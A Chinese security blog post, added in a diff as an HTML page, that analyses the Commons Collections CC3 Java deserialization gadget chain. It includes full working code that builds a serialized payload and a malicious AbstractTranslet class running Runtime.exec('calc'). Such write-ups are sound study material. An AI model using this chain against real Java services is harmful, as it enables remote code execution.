@@ -1,0 +1,402 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <meta charset="utf-8" />
+    <title>CC3分析 | W000i</title>
+    <meta name="author" content="W00i" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>W000I</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;主页</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;W000I</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">主页</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>CC3分析</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/8/19
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/Java/" style="color: #00a596">
+                    Java
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>Commons Collections是Apache软件基金会的一个开源项目，它提供了一组可复用的数据结构和算法的实现，旨在扩展和增强Java集合框架，以便更好地满足不同类型应用的需求。该项目包含了多种不同类型的集合类、迭代器、队列、堆栈、映射、列表、集等数据结构实现，以及许多实用程序类和算法实现。它的代码质量较高，被广泛应用于Java应用程序开发中。</p>
+<span id="more"></span>
+
+<p>CC3采用了类的动态加载机制实现执行任意代码，类的动态加载大致原理为使用ClassLoader#loadClass从已加载的类缓存、父加载器等位置寻找类，如果没找到会调用findClass()，findClass()会根据名字或者位置加载字节码然后调用defineClass(),defineClass()会将传递的字节码转换为Java类。</p>
+<p>直接定位到ClassLoader#defineClass，作用域为protected，我们需要一个public的</p>
+<p><img src="/../imgs/CC3%E5%88%86%E6%9E%90/image-1708444021529.png" alt="image-1708444021529"></p>
+<p>找了一下哪里调用了这个方法</p>
+<p><img src="/../imgs/CC3%E5%88%86%E6%9E%90/image-1708444028869.png" alt="image-1708444028869"></p>
+<p>再往上找找，这个没标注作用域，默认是同一个包里才可以调用</p>
+<p><img src="/../imgs/CC3%E5%88%86%E6%9E%90/image-1708444036532.png" alt="image-1708444036532"></p>
+<p>找到了defineTransletClasses方法调用了，但是这个方法是私有的</p>
+<p><img src="/../imgs/CC3%E5%88%86%E6%9E%90/image-1708444044353.png" alt="image-1708444044353"></p>
+<p>继续往上找，getTransletInstance方法调用了defineTransletClasses，但是他还是私有的。这个方法还调用了newInstance方法，可以实例化对象，走到这边就可以运行自定义类的静态方法</p>
+<p><img src="/../imgs/CC3%E5%88%86%E6%9E%90/image-1708444051466.png" alt="image-1708444051466"></p>
+<p>找到newTransformer方法，并且是一个公开的方法</p>
+<p><img src="/../imgs/CC3%E5%88%86%E6%9E%90/image-1708444058037.png" alt="image-1708444058037"></p>
+<p>尝试调用newTransformer进行动态类加载，发现一些限制条件，_name需要不为null，</p>
+<p><img src="/../imgs/CC3%E5%88%86%E6%9E%90/image-1708444071984.png" alt="image-1708444071984"></p>
+<p><em>bytecodes值需要不为null，</em>tfactory需要赋值</p>
+<p><img src="/../imgs/CC3%E5%88%86%E6%9E%90/image-1708444098270.png" alt="image-1708444098270"></p>
+<p>通过反射分别给这三个参数赋值并尝试调用</p>
+<pre><code class="java">package org.example;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+
+public class CC3_Test &#123;
+    public static void main(String[] args) throws Exception&#123;
+        TemplatesImpl templates = new TemplatesImpl();
+        Class c = templates.getClass();
+        Field nameField = c.getDeclaredField(&quot;_name&quot;);
+        nameField.setAccessible(true);
+        nameField.set(templates,&quot;a&quot;);
+
+        Field bytecodesField = c.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodesField.setAccessible(true);
+        byte[] bytecode = Files.readAllBytes(Paths.get(&quot;D://tmp//class//Test.class&quot;));
+        byte[][] bytecodes = &#123;bytecode&#125;;
+        bytecodesField.set(templates,bytecodes);
+
+        Field tfactoryField = c.getDeclaredField(&quot;_tfactory&quot;);
+        tfactoryField.setAccessible(true);
+        tfactoryField.set(templates,new TransformerFactoryImpl());
+
+        templates.newTransformer();
+
+    &#125;
+&#125;
+</code></pre>
+<p>在bytecode目录放一个恶意的class，因为利用过程中会验证传进去的class是否继承了<em>ABSTRACT_TRANSLET</em>引用的类，所以恶意的class要继承AbstractTranslet</p>
+<p><img src="/../imgs/CC3%E5%88%86%E6%9E%90/image-1708444108982.png" alt="image-1708444108982"></p>
+<pre><code class="java">package org.example;
+
+import java.io.IOException;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+public class Test extends AbstractTranslet&#123;
+    static &#123;
+        try &#123;
+            Runtime.getRuntime().exec(&quot;calc&quot;);
+        &#125; catch (IOException e) &#123;
+            throw new RuntimeException(e);
+        &#125;
+    &#125;
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;
+
+    &#125;
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;
+
+    &#125;
+&#125;
+</code></pre>
+<p>运行发现成功执行了恶意class</p>
+<p><img src="/../imgs/CC3%E5%88%86%E6%9E%90/image-1708444119616.png" alt="image-1708444119616"></p>
+<p>发现ysoserial的CC3还用到了一个InstantiateTransformer类，这个类的transform方法满足条件后，会获取一个类的构造函数，然后使用这个构造函数创建一个新的对象实例</p>
+<p><img src="/../imgs/CC3%E5%88%86%E6%9E%90/image-1708444125737.png" alt="image-1708444125737"></p>
+<p>然后我们找到TrAXFilter的构造函数调用了newTransformer方法</p>
+<p><img src="/../imgs/CC3%E5%88%86%E6%9E%90/image-1708444139691.png" alt="image-1708444139691"></p>
+<p>如果传递一个TemplatesImpl，他就回去调用TemplatesImpl的newTransformer函数</p>
+<p><img src="/../imgs/CC3%E5%88%86%E6%9E%90/image-1708444148187.png" alt="image-1708444148187"></p>
+<p>现在使用InstantiateTransformer类的transform方法，传递参数TrAXFilter类，它会去获取TrAXFilter的构造方法并执行</p>
+<p><img src="/../imgs/CC3%E5%88%86%E6%9E%90/image-1708444153661.png" alt="image-1708444153661"></p>
+<pre><code class="java">package org.example;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections.functors.InstantiateTransformer;
+
+import javax.xml.transform.Templates;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+
+public class CC3_Test &#123;
+    public static void main(String[] args) throws Exception&#123;
+        TemplatesImpl templates = new TemplatesImpl();
+        Class c = templates.getClass();
+        Field nameField = c.getDeclaredField(&quot;_name&quot;);
+        nameField.setAccessible(true);
+        nameField.set(templates,&quot;a&quot;);
+
+        Field bytecodesField = c.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodesField.setAccessible(true);
+        byte[] bytecode = Files.readAllBytes(Paths.get(&quot;D://tmp//class//Test.class&quot;));
+        byte[][] bytecodes = &#123;bytecode&#125;;
+        bytecodesField.set(templates,bytecodes);
+
+        Field tfactoryField = c.getDeclaredField(&quot;_tfactory&quot;);
+        tfactoryField.setAccessible(true);
+        tfactoryField.set(templates,new TransformerFactoryImpl());
+
+//        templates.newTransformer();
+        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;);
+        instantiateTransformer.transform(TrAXFilter.class);
+
+    &#125;
+&#125;
+</code></pre>
+<p>后面把CC1的代码拿过来，InvokerTransformer换成instantiateTransformer，new<br>ConstantTransformer(Runtime.class)参数换成TrAXFilter.class</p>
+<p><img src="/../imgs/CC3%E5%88%86%E6%9E%90/image-1708444165337.png" alt="image-1708444165337"></p>
+<p>完整代码</p>
+<pre><code class="java">package org.example;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InstantiateTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC3_Test &#123;
+    public static void main(String[] args) throws Exception&#123;
+        TemplatesImpl templates = new TemplatesImpl();
+        Class c = templates.getClass();
+        Field nameField = c.getDeclaredField(&quot;_name&quot;);
+        nameField.setAccessible(true);
+        nameField.set(templates,&quot;a&quot;);
+
+        Field bytecodesField = c.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodesField.setAccessible(true);
+        byte[] bytecode = Files.readAllBytes(Paths.get(&quot;D://tmp//class//Test.class&quot;));
+        byte[][] bytecodes = &#123;bytecode&#125;;
+        bytecodesField.set(templates,bytecodes);
+
+        Field tfactoryField = c.getDeclaredField(&quot;_tfactory&quot;);
+        tfactoryField.setAccessible(true);
+        tfactoryField.set(templates,new TransformerFactoryImpl());
+
+//        templates.newTransformer();
+        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;);
+//        instantiateTransformer.transform(TrAXFilter.class);
+
+        Transformer[] transform1 = new Transformer[]&#123;
+                new ConstantTransformer(TrAXFilter.class),
+                instantiateTransformer
+        &#125;;
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transform1);
+
+        HashMap&lt;Object,Object&gt; map = new HashMap();
+        map.put(&quot;value&quot;,&quot;value&quot;);
+        Map&lt;Object,Object&gt; transformap = TransformedMap.decorate(map, null, chainedTransformer);
+
+        Class annotationClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor declaredConstructor = annotationClass.getDeclaredConstructor(Class.class, Map.class);
+        declaredConstructor.setAccessible(true);
+        Object o = declaredConstructor.newInstance(Target.class, transformap);
+        serialize(o);
+//        unserialize(&quot;ser.bin&quot;);
+    &#125;
+
+    public static void serialize(Object obj) throws Exception&#123;
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        objectOutputStream.writeObject(obj);
+        System.out.println(&quot;serialize&quot;);
+    &#125;
+
+    public static Object unserialize(String str) throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(str));
+        Object obj = objectInputStream.readObject();
+        System.out.println(&quot;unserialize&quot;);
+        return obj;
+    &#125;
+
+
+&#125;
+</code></pre>
+<p>利用链</p>
+<p>AnnotationInvocationHandler#readObject –&gt; AbstractInputCheckedMapDecorator.MapEntry#setValue –&gt; TransformedMap#checkSetValue –&gt; ChainedTransformer#transform –&gt; InstantiateTransformer.transform –&gt; TrAXFilter.TrAXFilter –&gt;Transformer.newTransformer() –&gt; defineClass-&gt;newInstance</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 W000i
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;W00i
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+	
+	
+	{% if theme.fireworks %}
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/lib/fireworks.js"></script>
+    {% endif %}
+ 
+</body>
+</html>
